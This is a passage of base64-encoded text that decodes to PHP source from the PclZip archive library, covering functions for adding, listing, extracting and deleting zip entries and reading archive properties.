PUFRfQ09NTUVOVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQUREX0NPTU1FTlQgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1BSRVBFTkRfQ09NTUVOVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09OID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCgkJCQkJCQkJCQkJICAgKSk7DQogICAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KDQogICAgZWxzZSB7DQoNCiAgICAgICR2X29wdGlvbnNbUENMWklQX09QVF9BRERfUEFUSF0gPSAkdl9hZGRfcGF0aCA9ICR2X2FyZ19saXN0WzBdOw0KDQogICAgICBpZiAoJHZfc2l6ZSA9PSAyKSB7DQogICAgICAgICR2X29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF0gPSAkdl9hcmdfbGlzdFsxXTsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKCR2X3NpemUgPiAyKSB7DQogICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIG51bWJlciAvIHR5cGUgb2YgYXJndW1lbnRzIik7DQoNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgJHRoaXMtPnByaXZPcHRpb25EZWZhdWx0VGhyZXNob2xkKCR2X29wdGlvbnMpOw0KDQogICR2X3N0cmluZ19saXN0ID0gYXJyYXkoKTsNCiAgJHZfYXR0X2xpc3QgPSBhcnJheSgpOw0KICAkdl9maWxlZGVzY3JfbGlzdCA9IGFycmF5KCk7DQogICRwX3Jlc3VsdF9saXN0ID0gYXJyYXkoKTsNCiAgDQogIGlmIChpc19hcnJheSgkcF9maWxlbGlzdCkpIHsNCiAgDQogICAgaWYgKGlzc2V0KCRwX2ZpbGVsaXN0WzBdKSAmJiBpc19hcnJheSgkcF9maWxlbGlzdFswXSkpIHsNCiAgICAgICR2X2F0dF9saXN0ID0gJHBfZmlsZWxpc3Q7DQogICAgfQ0KICAgIA0KICAgIGVsc2Ugew0KICAgICAgJHZfc3RyaW5nX2xpc3QgPSAkcF9maWxlbGlzdDsNCiAgICB9DQogIH0NCg0KICBlbHNlIGlmIChpc19zdHJpbmcoJHBfZmlsZWxpc3QpKSB7DQogICAgJHZfc3RyaW5nX2xpc3QgPSBleHBsb2RlKFBDTFpJUF9TRVBBUkFUT1IsICRwX2ZpbGVsaXN0KTsNCiAgfQ0KDQogIGVsc2Ugew0KICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIHZhcmlhYmxlIHR5cGUgJyIuZ2V0dHlwZSgkcF9maWxlbGlzdCkuIicgZm9yIHBfZmlsZWxpc3QiKTsNCiAgICByZXR1cm4gMDsNCiAgfQ0KICANCiAgaWYgKHNpemVvZigkdl9zdHJpbmdfbGlzdCkgIT0gMCkgew0KICAgIGZvcmVhY2ggKCR2X3N0cmluZ19saXN0IGFzICR2X3N0cmluZykgew0KICAgICAgJHZfYXR0X2xpc3RbXVtQQ0xaSVBfQVRUX0ZJTEVfTkFNRV0gPSAkdl9zdHJpbmc7DQogICAgfQ0KICB9DQogIA0KICAkdl9zdXBwb3J0ZWRfYXR0cmlidXRlcw0KICA9IGFycmF5ICggUENMWklQX0FUVF9GSUxFX05BTUUgPT4gJ21hbmRhdG9yeScNCiAgICAgICAgICAgLFBDTFpJUF9BVFRfRklMRV9ORVdfU0hPUlRfTkFNRSA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfTkVXX0ZVTExfTkFNRSA9PiAnb3B0aW9uYWwnDQogICAgICAgICAgICxQQ0xaSVBfQVRUX0ZJTEVfTVRJTUUgPT4gJ29wdGlvbmFsJw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX0NPTlRFTlQgPT4gJ29wdGlvbmFsJw0KICAgICAgICAgICAsUENMWklQX0FUVF9GSUxFX0NPTU1FTlQgPT4gJ29wdGlvbmFsJw0KCQkJCQkpOw0KICBmb3JlYWNoICgkdl9hdHRfbGlzdCBhcyAkdl9lbnRyeSkgew0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RmlsZURlc2NyUGFyc2VBdHQoJHZfZW50cnksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdl9maWxlZGVzY3JfbGlzdFtdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHZfb3B0aW9ucywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR2X3N1cHBvcnRlZF9hdHRyaWJ1dGVzKTsNCiAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgfQ0KDQogICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RmlsZURlc2NyRXhwYW5kKCR2X2ZpbGVkZXNjcl9saXN0LCAkdl9vcHRpb25zKTsNCiAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgcmV0dXJuIDA7DQogIH0NCg0KICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkFkZCgkdl9maWxlZGVzY3JfbGlzdCwgJHBfcmVzdWx0X2xpc3QsICR2X29wdGlvbnMpOw0KICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICByZXR1cm4gMDsNCiAgfQ0KDQogIHJldHVybiAkcF9yZXN1bHRfbGlzdDsNCn0NCg0KZnVuY3Rpb24gbGlzdENvbnRlbnQoKQ0Kew0KICAkdl9yZXN1bHQ9MTsNCg0KICAkdGhpcy0+cHJpdkVycm9yUmVzZXQoKTsNCg0KICBpZiAoISR0aGlzLT5wcml2Q2hlY2tGb3JtYXQoKSkgew0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogICRwX2xpc3QgPSBhcnJheSgpOw0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2TGlzdCgkcF9saXN0KSkgIT0gMSkNCiAgew0KICAgIHVuc2V0KCRwX2xpc3QpOw0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogIHJldHVybiAkcF9saXN0Ow0KfQ0KDQpmdW5jdGlvbiBleHRyYWN0KCkNCnsNCiAgJHZfcmVzdWx0PTE7DQoNCiAgJHRoaXMtPnByaXZFcnJvclJlc2V0KCk7DQoNCiAgaWYgKCEkdGhpcy0+cHJpdkNoZWNrRm9ybWF0KCkpIHsNCiAgICByZXR1cm4oMCk7DQogIH0NCg0KICAkdl9vcHRpb25zID0gYXJyYXkoKTsNCiAgJHZfcGF0aCA9ICcnOw0KICAkdl9yZW1vdmVfcGF0aCA9ICIiOw0KICAkdl9yZW1vdmVfYWxsX3BhdGggPSBmYWxzZTsNCg0KICAkdl9zaXplID0gZnVuY19udW1fYXJncygpOw0KDQogICR2X29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklOR10gPSBGQUxTRTsNCg0KICBpZiAoJHZfc2l6ZSA+IDApIHsNCiAgICAkdl9hcmdfbGlzdCA9IGZ1bmNfZ2V0X2FyZ3MoKTsNCg0KICAgIGlmICgoaXNfaW50ZWdlcigkdl9hcmdfbGlzdFswXSkpICYmICgkdl9hcmdfbGlzdFswXSA+IDc3MDAwKSkgew0KDQogICAgICAkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlBhcnNlT3B0aW9ucygkdl9hcmdfbGlzdCwgJHZfc2l6ZSwgJHZfb3B0aW9ucywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5IChQQ0xaSVBfT1BUX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0FERF9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BSRV9FWFRSQUNUID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BPU1RfRVhUUkFDVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfU0VUX0NITU9EID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9OQU1FID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9FUkVHID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9QUkVHID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9JTkRFWCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkcgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0VYVFJBQ1RfSU5fT1VUUFVUID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9SRVBMQUNFX05FV0VSID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsUENMWklQX09QVF9TVE9QX09OX0VSUk9SID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsUENMWklQX09QVF9FWFRSQUNUX0RJUl9SRVNUUklDVElPTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09OID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGID0+ICdvcHRpb25hbCcNCgkJCQkJCQkJCQkJICAgICkpOw0KICAgICAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICAgIHJldHVybiAwOw0KICAgICAgfQ0KDQogICAgICBpZiAoaXNzZXQoJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1BBVEhdKSkgew0KICAgICAgICAkdl9wYXRoID0gJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1BBVEhdOw0KICAgICAgfQ0KICAgICAgaWYgKGlzc2V0KCR2X29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfUEFUSF0pKSB7DQogICAgICAgICR2X3JlbW92ZV9wYXRoID0gJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIXTsNCiAgICAgIH0NCiAgICAgIGlmIChpc3NldCgkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkpIHsNCiAgICAgICAgJHZfcmVtb3ZlX2FsbF9wYXRoID0gJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSF07DQogICAgICB9DQogICAgICBpZiAoaXNzZXQoJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX0FERF9QQVRIXSkpIHsNCiAgICAgICAgaWYgKChzdHJsZW4oJHZfcGF0aCkgPiAwKSAmJiAoc3Vic3RyKCR2X3BhdGgsIC0xKSAhPSAnLycpKSB7DQogICAgICAgICAgJHZfcGF0aCAuPSAnLyc7DQogICAgICAgIH0NCiAgICAgICAgJHZfcGF0aCAuPSAkdl9vcHRpb25zW1BDTFpJUF9PUFRfQUREX1BBVEhdOw0KICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2Ugew0KDQogICAgICAkdl9wYXRoID0gJHZfYXJnX2xpc3RbMF07DQoNCiAgICAgIGlmICgkdl9zaXplID09IDIpIHsNCiAgICAgICAgJHZfcmVtb3ZlX3BhdGggPSAkdl9hcmdfbGlzdFsxXTsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKCR2X3NpemUgPiAyKSB7DQogICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIG51bWJlciAvIHR5cGUgb2YgYXJndW1lbnRzIik7DQoNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KICB9DQoNCiAgJHRoaXMtPnByaXZPcHRpb25EZWZhdWx0VGhyZXNob2xkKCR2X29wdGlvbnMpOw0KDQoNCiAgJHBfbGlzdCA9IGFycmF5KCk7DQogICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RXh0cmFjdEJ5UnVsZSgkcF9saXN0LCAkdl9wYXRoLCAkdl9yZW1vdmVfcGF0aCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdl9yZW1vdmVfYWxsX3BhdGgsICR2X29wdGlvbnMpOw0KICBpZiAoJHZfcmVzdWx0IDwgMSkgew0KICAgIHVuc2V0KCRwX2xpc3QpOw0KICAgIHJldHVybigwKTsNCiAgfQ0KDQogIHJldHVybiAkcF9saXN0Ow0KfQ0KDQoNCg0KZnVuY3Rpb24gZXh0cmFjdEJ5SW5kZXgoJHBfaW5kZXgpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICghJHRoaXMtPnByaXZDaGVja0Zvcm1hdCgpKSB7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgJHZfb3B0aW9ucyA9IGFycmF5KCk7DQogICR2X3BhdGggPSAnJzsNCiAgJHZfcmVtb3ZlX3BhdGggPSAiIjsNCiAgJHZfcmVtb3ZlX2FsbF9wYXRoID0gZmFsc2U7DQoNCiAgJHZfc2l6ZSA9IGZ1bmNfbnVtX2FyZ3MoKTsNCg0KICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkddID0gRkFMU0U7DQoNCiAgaWYgKCR2X3NpemUgPiAxKSB7DQogICAgJHZfYXJnX2xpc3QgPSBmdW5jX2dldF9hcmdzKCk7DQoNCiAgICBhcnJheV9zaGlmdCgkdl9hcmdfbGlzdCk7DQogICAgJHZfc2l6ZS0tOw0KDQogICAgaWYgKChpc19pbnRlZ2VyKCR2X2FyZ19saXN0WzBdKSkgJiYgKCR2X2FyZ19saXN0WzBdID4gNzcwMDApKSB7DQoNCiAgICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UGFyc2VPcHRpb25zKCR2X2FyZ19saXN0LCAkdl9zaXplLCAkdl9vcHRpb25zLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkgKFBDTFpJUF9PUFRfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfUkVNT1ZFX1BBVEggPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX1JFTU9WRV9BTExfUEFUSCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfRVhUUkFDVF9BU19TVFJJTkcgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0FERF9QQVRIID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BSRV9FWFRSQUNUID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX0NCX1BPU1RfRVhUUkFDVCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfU0VUX0NITU9EID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9SRVBMQUNFX05FV0VSID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsUENMWklQX09QVF9TVE9QX09OX0VSUk9SID0+ICdvcHRpb25hbCcNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAsUENMWklQX09QVF9FWFRSQUNUX0RJUl9SRVNUUklDVElPTiA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRCA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfVEVNUF9GSUxFX09OID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9URU1QX0ZJTEVfT0ZGID0+ICdvcHRpb25hbCcNCgkJCQkJCQkJCQkJICAgKSk7DQogICAgICBpZiAoJHZfcmVzdWx0ICE9IDEpIHsNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQoNCiAgICAgIGlmIChpc3NldCgkdl9vcHRpb25zW1BDTFpJUF9PUFRfUEFUSF0pKSB7DQogICAgICAgICR2X3BhdGggPSAkdl9vcHRpb25zW1BDTFpJUF9PUFRfUEFUSF07DQogICAgICB9DQogICAgICBpZiAoaXNzZXQoJHZfb3B0aW9uc1tQQ0xaSVBfT1BUX1JFTU9WRV9QQVRIXSkpIHsNCiAgICAgICAgJHZfcmVtb3ZlX3BhdGggPSAkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX1BBVEhdOw0KICAgICAgfQ0KICAgICAgaWYgKGlzc2V0KCR2X29wdGlvbnNbUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEhdKSkgew0KICAgICAgICAkdl9yZW1vdmVfYWxsX3BhdGggPSAkdl9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXTsNCiAgICAgIH0NCiAgICAgIGlmIChpc3NldCgkdl9vcHRpb25zW1BDTFpJUF9PUFRfQUREX1BBVEhdKSkgew0KICAgICAgICBpZiAoKHN0cmxlbigkdl9wYXRoKSA+IDApICYmIChzdWJzdHIoJHZfcGF0aCwgLTEpICE9ICcvJykpIHsNCiAgICAgICAgICAkdl9wYXRoIC49ICcvJzsNCiAgICAgICAgfQ0KICAgICAgICAkdl9wYXRoIC49ICR2X29wdGlvbnNbUENMWklQX09QVF9BRERfUEFUSF07DQogICAgICB9DQogICAgICBpZiAoIWlzc2V0KCR2X29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklOR10pKSB7DQogICAgICAgICR2X29wdGlvbnNbUENMWklQX09QVF9FWFRSQUNUX0FTX1NUUklOR10gPSBGQUxTRTsNCiAgICAgIH0NCiAgICAgIGVsc2Ugew0KICAgICAgfQ0KICAgIH0NCg0KICAgIGVsc2Ugew0KDQogICAgICAkdl9wYXRoID0gJHZfYXJnX2xpc3RbMF07DQoNCiAgICAgIGlmICgkdl9zaXplID09IDIpIHsNCiAgICAgICAgJHZfcmVtb3ZlX3BhdGggPSAkdl9hcmdfbGlzdFsxXTsNCiAgICAgIH0NCiAgICAgIGVsc2UgaWYgKCR2X3NpemUgPiAyKSB7DQogICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIG51bWJlciAvIHR5cGUgb2YgYXJndW1lbnRzIik7DQoNCiAgICAgICAgcmV0dXJuIDA7DQogICAgICB9DQogICAgfQ0KICB9DQoNCg0KICAkdl9hcmdfdHJpY2sgPSBhcnJheSAoUENMWklQX09QVF9CWV9JTkRFWCwgJHBfaW5kZXgpOw0KICAkdl9vcHRpb25zX3RyaWNrID0gYXJyYXkoKTsNCiAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZQYXJzZU9wdGlvbnMoJHZfYXJnX3RyaWNrLCBzaXplb2YoJHZfYXJnX3RyaWNrKSwgJHZfb3B0aW9uc190cmljaywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkgKFBDTFpJUF9PUFRfQllfSU5ERVggPT4gJ29wdGlvbmFsJyApKTsNCiAgaWYgKCR2X3Jlc3VsdCAhPSAxKSB7DQogICAgICByZXR1cm4gMDsNCiAgfQ0KICAkdl9vcHRpb25zW1BDTFpJUF9PUFRfQllfSU5ERVhdID0gJHZfb3B0aW9uc190cmlja1tQQ0xaSVBfT1BUX0JZX0lOREVYXTsNCg0KICAkdGhpcy0+cHJpdk9wdGlvbkRlZmF1bHRUaHJlc2hvbGQoJHZfb3B0aW9ucyk7DQoNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkV4dHJhY3RCeVJ1bGUoJHBfbGlzdCwgJHZfcGF0aCwgJHZfcmVtb3ZlX3BhdGgsICR2X3JlbW92ZV9hbGxfcGF0aCwgJHZfb3B0aW9ucykpIDwgMSkgew0KICAgICAgcmV0dXJuKDApOw0KICB9DQoNCiAgcmV0dXJuICRwX2xpc3Q7DQp9DQoNCmZ1bmN0aW9uIGRlbGV0ZSgpDQp7DQogICR2X3Jlc3VsdD0xOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICghJHRoaXMtPnByaXZDaGVja0Zvcm1hdCgpKSB7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgJHZfb3B0aW9ucyA9IGFycmF5KCk7DQoNCiAgJHZfc2l6ZSA9IGZ1bmNfbnVtX2FyZ3MoKTsNCg0KICBpZiAoJHZfc2l6ZSA+IDApIHsNCiAgICAkdl9hcmdfbGlzdCA9IGZ1bmNfZ2V0X2FyZ3MoKTsNCg0KICAgICR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2UGFyc2VPcHRpb25zKCR2X2FyZ19saXN0LCAkdl9zaXplLCAkdl9vcHRpb25zLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcnJheSAoUENMWklQX09QVF9CWV9OQU1FID0+ICdvcHRpb25hbCcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQQ0xaSVBfT1BUX0JZX0VSRUcgPT4gJ29wdGlvbmFsJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBDTFpJUF9PUFRfQllfUFJFRyA9PiAnb3B0aW9uYWwnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUENMWklQX09QVF9CWV9JTkRFWCA9PiAnb3B0aW9uYWwnICkpOw0KICAgIGlmICgkdl9yZXN1bHQgIT0gMSkgew0KICAgICAgICByZXR1cm4gMDsNCiAgICB9DQogIH0NCg0KICAkdGhpcy0+cHJpdkRpc2FibGVNYWdpY1F1b3RlcygpOw0KDQogICR2X2xpc3QgPSBhcnJheSgpOw0KICBpZiAoKCR2X3Jlc3VsdCA9ICR0aGlzLT5wcml2RGVsZXRlQnlSdWxlKCR2X2xpc3QsICR2X29wdGlvbnMpKSAhPSAxKSB7DQogICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgdW5zZXQoJHZfbGlzdCk7DQogICAgcmV0dXJuKDApOw0KICB9DQoNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgcmV0dXJuICR2X2xpc3Q7DQp9DQoNCmZ1bmN0aW9uIGRlbGV0ZUJ5SW5kZXgoJHBfaW5kZXgpDQp7DQogIA0KICAkcF9saXN0ID0gJHRoaXMtPmRlbGV0ZShQQ0xaSVBfT1BUX0JZX0lOREVYLCAkcF9pbmRleCk7DQoNCiAgcmV0dXJuICRwX2xpc3Q7DQp9DQoNCmZ1bmN0aW9uIHByb3BlcnRpZXMoKQ0Kew0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogICR0aGlzLT5wcml2RGlzYWJsZU1hZ2ljUXVvdGVzKCk7DQoNCiAgaWYgKCEkdGhpcy0+cHJpdkNoZWNrRm9ybWF0KCkpIHsNCiAgICAkdGhpcy0+cHJpdlN3YXBCYWNrTWFnaWNRdW90ZXMoKTsNCiAgICByZXR1cm4oMCk7DQogIH0NCg0KICAkdl9wcm9wID0gYXJyYXkoKTsNCiAgJHZfcHJvcFsnY29tbWVudCddID0gJyc7DQogICR2X3Byb3BbJ25iJ10gPSAwOw0KICAkdl9wcm9wWydzdGF0dXMnXSA9ICdub3RfZXhpc3QnOw0KDQogIGlmIChAaXNfZmlsZSgkdGhpcy0+emlwbmFtZSkpDQogIHsNCiAgICBpZiAoKCR0aGlzLT56aXBfZmQgPSBAZm9wZW4oJHRoaXMtPnppcG5hbWUsICdyYicpKSA9PSAwKQ0KICAgIHsNCiAgICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgICAgDQogICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX1JFQURfT1BFTl9GQUlMLCAnVW5hYmxlIHRvIG9wZW4gYXJjaGl2ZSBcJycuJHRoaXMtPnppcG5hbWUuJ1wnIGluIGJpbmFyeSByZWFkIG1vZGUnKTsNCg0KICAgICAgcmV0dXJuIDA7DQogICAgfQ0KDQogICAgJHZfY2VudHJhbF9kaXIgPSBhcnJheSgpOw0KICAgIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZSZWFkRW5kQ2VudHJhbERpcigkdl9jZW50cmFsX2RpcikpICE9IDEpDQogICAgew0KICAgICAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQogICAgICByZXR1cm4gMDsNCiAgICB9DQoNCiAgICAkdGhpcy0+cHJpdkNsb3NlRmQoKTsNCg0KICAgICR2X3Byb3BbJ2NvbW1lbnQnXSA9ICR2X2NlbnRyYWxfZGlyWydjb21tZW50J107DQogICAgJHZfcHJvcFsnbmInXSA9ICR2X2NlbnRyYWxfZGlyWydlbnRyaWVzJ107DQogICAgJHZfcHJvcFsnc3RhdHVzJ10gPSAnb2snOw0KICB9DQoNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgcmV0dXJuICR2X3Byb3A7DQp9DQoNCmZ1bmN0aW9uIGR1cGxpY2F0ZSgkcF9hcmNoaXZlKQ0Kew0KICAkdl9yZXN1bHQgPSAxOw0KDQogICR0aGlzLT5wcml2RXJyb3JSZXNldCgpOw0KDQogIGlmICgoaXNfb2JqZWN0KCRwX2FyY2hpdmUpKSAmJiAoZ2V0X2NsYXNzKCRwX2FyY2hpdmUpID0